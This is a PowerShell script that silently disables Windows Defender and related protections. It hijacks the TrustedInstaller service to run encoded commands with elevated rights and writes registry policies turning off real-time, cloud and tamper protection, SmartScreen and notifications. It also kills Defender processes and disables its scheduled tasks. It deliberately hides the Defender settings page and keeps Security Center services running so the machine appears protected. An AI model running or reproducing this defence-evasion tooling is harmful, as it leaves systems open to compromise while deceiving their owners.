# Silent Disable All Security Script
# Based on "Disable Defender Script by Zoic"
# Purpose: Disable all Windows Defender and related security features silently while preserving the appearance of functionality
# Targets: Real-time protection, behavior monitoring, cloud protection, Tamper Protection, SmartScreen, notifications, and scheduled tasks

# Check for administrative privileges
If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    Start-Process PowerShell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
    Exit
}

# Function to run commands with TrustedInstaller privileges
function Run-Trusted([String]$command) {
    Stop-Service -Name TrustedInstaller -Force -ErrorAction SilentlyContinue
    $service = Get-WmiObject -Class Win32_Service -Filter "Name='TrustedInstaller'"
    $DefaultBinPath = $service.PathName
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $base64Command = [Convert]::ToBase64String($bytes)
    sc.exe config TrustedInstaller binPath= "cmd.exe /c powershell.exe -encodedcommand $base64Command" | Out-Null
    sc.exe start TrustedInstaller | Out-Null
    sc.exe config TrustedInstaller binpath= "`"$DefaultBinPath`"" | Out-Null
    Stop-Service -Name TrustedInstaller -Force -ErrorAction SilentlyContinue
}

# Create registry file to disable all security features silently
$regContent = @'
Windows Registry Editor Version 5.00

; Disable core Defender functionalities
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
"DisableAntiSpyware"=dword:00000001
"DisableAntiVirus"=dword:00000001
"AllowFastServiceStartup"=dword:00000000

; Disable real-time protection and monitoring
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]
"DisableRealtimeMonitoring"=dword:00000001
"DisableBehaviorMonitoring"=dword:00000001
"DisableOnAccessProtection"=dword:00000001
"DisableScanOnRealtimeEnable"=dword:00000001
"DisableIOAVProtection"=dword:00000001
"DisableScriptScanning"=dword:00000001
"DisableRoutinelyTakingAction"=dword:00000001

; Disable cloud-based protection
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet]
"DisableBlockAtFirstSeen"=dword:00000001
"SpyNetReporting"=dword:00000000
"LocalSettingOverrideSpynetReporting"=dword:00000000

; Disable scanning options
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Scan]
"DisableArchiveScanning"=dword:00000001
"DisableRemovableDriveScanning"=dword:00000001
"DisableScanningMappedNetworkDrivesForFullScan"=dword:00000001
"DisableScanningNetworkFiles"=dword:00000001
"DisableCatchupFullScan"=dword:00000001
"DisableCatchupQuickScan"=dword:00000001
"ScanParameters"=dword:00000000
"ScheduleDay"=dword:00000008
"ScheduleTime"=dword:00000000

; Disable Tamper Protection
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features]
"TamperProtection"=dword:00000000
"TamperProtectionSource"=dword:00000002

; Disable SmartScreen
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System]
"EnableSmartScreen"=dword:00000000
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen]
"ConfigureAppInstallControlEnabled"=dword:00000000
"ConfigureAppInstallControl"="Anywhere"
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer]
"SmartScreenEnabled"="Off"
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost]
"EnableWebContentEvaluation"=dword:00000000
"PreventOverride"=dword:00000000

; Suppress notifications
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications]
"DisableNotifications"=dword:00000001
"DisableEnhancedNotifications"=dword:00000001
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting]
"DisableEnhancedNotifications"=dword:00000001

; Hide Defender settings page to avoid user suspicion
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
"SettingsPageVisibility"="hide:windowsdefender;"
'@

# Save registry file to temp directory
$regPath = "$env:TEMP\silentDisableAllSecurity.reg"
Set-Content -Path $regPath -Value $regContent -Force

# Apply registry changes using TrustedInstaller
$command = "regedit.exe /s `"$regPath`""
Run-Trusted -command $command

# Clean up registry file
Remove-Item -Path $regPath -Force -ErrorAction SilentlyContinue

# Stop critical Defender processes to disable protection
$command = 'Stop-Process -Name MpDefenderCoreService -Force -ErrorAction SilentlyContinue; ' +
           'Stop-Process -Name MsMpEng -Force -ErrorAction SilentlyContinue; ' +
           'Stop-Process -Name Sense -Force -ErrorAction SilentlyContinue'
Run-Trusted -command $command

# Ensure Security Center and UI services remain active to maintain appearance
Start-Service -Name wscsvc -ErrorAction SilentlyContinue
Start-Service -Name SecurityHealthService -ErrorAction SilentlyContinue

# Disable Defender scheduled tasks silently
$tasks = Get-ScheduledTask | Where-Object { $_.TaskName -like 'Windows Defender*' }
foreach ($task in $tasks) {
    Disable-ScheduledTask -TaskName $task.TaskName -ErrorAction SilentlyContinue
}

# Prompt for system restart to apply changes
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show('Windows Defender and related security features have been disabled silently. The Windows Security interface will remain visible but non-functional. Please restart your computer to apply changes.', 'Silent Disable Security', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
